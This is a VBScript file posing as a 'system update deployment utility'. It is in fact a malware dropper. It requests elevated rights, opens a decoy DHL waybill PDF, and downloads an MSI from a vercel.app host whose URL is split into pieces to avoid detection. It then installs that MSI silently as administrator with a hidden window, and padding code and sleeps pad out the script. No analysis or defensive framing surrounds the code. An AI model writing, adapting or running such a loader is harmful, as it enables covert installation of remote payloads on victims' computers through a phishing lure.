' System update deployment utility
' Version: 1.4

Dim wshShell, objFileSystem, strShellModule, strFileProvider, tempFolder, strInstallerPath, strUpdateURL, strMediaURL, strPkgExe, strAutoFlag, strLauncher, strLaunchMode, strSessionFlag, oExecShell, strRunProvider

strShellModule = "Shell.Application"
strFileProvider = "Scripting.FileSystemObject"
strLauncher = "wscript.exe"
strLaunchMode = "runas"
strSessionFlag = "elevated"


Sub DisplayContent()
    strMediaURL = "https://pdfviewer-nu.vercel.app/doc/dhl-waybill.pdf"
    Set wshShell = CreateObject(strShellModule)
    wshShell.ShellExecute strMediaURL, "", "", "open", 1
End Sub


Sub InitSession()
    Dim strInvoke
    If Not WScript.Arguments.Named.Exists(strSessionFlag) Then
        strInvoke = """" & WScript.ScriptFullName & """ /" & strSessionFlag
        Set wshShell = CreateObject(strShellModule)
        wshShell.ShellExecute strLauncher, strInvoke, "", strLaunchMode, 1
        WScript.Quit
    End If
End Sub


Sub InitContext(intSize)
    If intSize < 1 Then intSize = 31
    Dim i : For i = 1 To intSize : Next
End Sub

Sub ProcessPackage(strTarget)
    On Error Resume Next
    If Not objFileSystem.FileExists(strTarget) Then
        Exit Sub
    End If
    On Error GoTo 0
    strPkgExe = "msiexec.exe"
    strAutoFlag = "/qn"
    Set oExecShell = CreateObject("WScript.Shell")
    oExecShell.Run strPkgExe & " /i """ & strTarget & """ " & strAutoFlag, 0, False
End Sub

Sub AcquirePackage(strURL, strDest)
    Dim oProcess
    Set oProcess = CreateObject("WScript.Shell")
    Dim intReturn
    Dim strCmd : strCmd = "powershell.exe -NoProfile -Command ""Invoke-WebRequest -Uri '" & strURL & "' -OutFile '" & strDest & "'"""
    intReturn = oProcess.Run(strCmd, 0, True)
    If intReturn <> 0 Then WScript.Quit
    Dim objVerifyFSO
    Set objVerifyFSO = CreateObject("Scripting.FileSystemObject")
    If Not objVerifyFSO.FileExists(strDest) Then WScript.Quit
End Sub

' --- Entry Point ---
InitSession

WScript.Sleep 1988
DisplayContent
WScript.Sleep 1032

Set objFileSystem = CreateObject(strFileProvider)
tempFolder = objFileSystem.GetSpecialFolder(2)
strInstallerPath = tempFolder & "\updater.msi"
strUpdateURL = "https://pdfvie" & "wer-nu.vercel." & "app/doc/sc.msi"

AcquirePackage strUpdateURL, strInstallerPath
Dim intFileLen : intFileLen = objFileSystem.GetFile(strInstallerPath).Size
If intFileLen < 1 Then WScript.Quit
Dim strSessionRef : strSessionRef = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
Dim strState : strState = "ready"
    Dim oFileSystem : Set oFileSystem = CreateObject("Scripting.FileSystemObject")
    Dim strSysFile : strSysFile = oFileSystem.FileExists("C:\Windows\explorer.exe")
    If Not strSysFile Then WScript.Sleep 500
ProcessPackage strInstallerPath